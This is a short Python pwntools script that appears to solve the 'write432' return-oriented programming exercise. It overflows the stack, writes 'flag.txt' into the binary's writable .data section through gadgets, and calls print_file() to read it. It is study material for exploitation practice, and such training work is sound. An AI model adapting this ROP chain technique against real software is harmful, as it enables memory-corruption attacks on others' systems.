#!/usr/bin/python3

from pwn import *

padding = b'x' * 44    # Gets us to the return address on the stack
strspace = 0x0804a018  # Address of the .data section which is rw
gadget = 0x08048543    # mov dword [edi], ebp ; ret
pop2ret = 0x080485aa   # pop edi ; pop ebp ; ret
pop3ret = 0x080485a9   # pop esi ; pop edi ; pop ebp ; ret
target = 0x080483d0    # plt print_file()

rop = padding
rop += p32(pop2ret)
rop += p32(strspace)
rop += b"flag"
rop += p32(gadget)
rop += p32(pop2ret)
rop += p32(strspace + 0x4)
rop += b".txt"
rop += p32(gadget)
rop += p32(target)
rop += p32(pop3ret)
rop += p32(strspace)

with open("exploit", 'wb') as fh:
    fh.write(rop)

print("Current raw exploit written to 'exploit' for debugging.")
print("Launch in GDB and debug with 'run < exploit'")
print()

# Start the process
io = process("./write432")

# Read until the request for input
welcome = io.recvuntil(b">")

# Print the welcome message
print(welcome.decode())

# Send the exploit
io.sendline(rop)

# Get the result
print(io.recvall())
